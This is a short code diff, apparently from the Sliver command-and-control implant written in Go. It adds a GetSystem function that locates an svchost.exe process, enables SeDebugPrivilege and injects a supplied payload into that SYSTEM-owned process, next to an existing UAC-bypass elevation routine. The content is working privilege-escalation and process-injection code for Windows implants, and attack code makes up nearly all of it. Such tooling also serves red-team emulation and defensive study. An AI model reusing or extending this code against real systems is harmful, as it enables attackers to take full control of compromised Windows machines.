@@ -6,6 +6,8 @@ import (
 	// {{if .Debug}}
 	"fmt"
 	"log"
+	"runtime"
+
 	// {{end}}
 	"os"
 	"os/exec"
@@ -17,6 +19,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 
 	"sliver/sliver/ps"
+	"sliver/sliver/taskrunner"
 )
 
 const (
@@ -332,6 +335,25 @@ func Elevate() (err error) {
 		// {{if .Debug}}
 		log.Println("BypassUAC failed:", err)
 		// {{end}}
+	}
+	return
+}
+
+// GetSystem starts a new RemoteTask in a SYSTEM owned process
+func GetSystem(data []byte) (err error) {
+	hostingProcess := "svchost.exe"
+	procs, _ := ps.Processes()
+	for _, p := range procs {
+		if p.Executable == hostingProcess {
+			runtime.LockOSThread()
+			defer runtime.UnlockOSThread()
+			err = enableCurrentThreadPrivilege("SeDebugPrivilege")
+			if err != nil {
+				return
+			}
+			err = taskrunner.RemoteTask(p.Pid, data)
+			break
+		}
 	}
 	return
 }
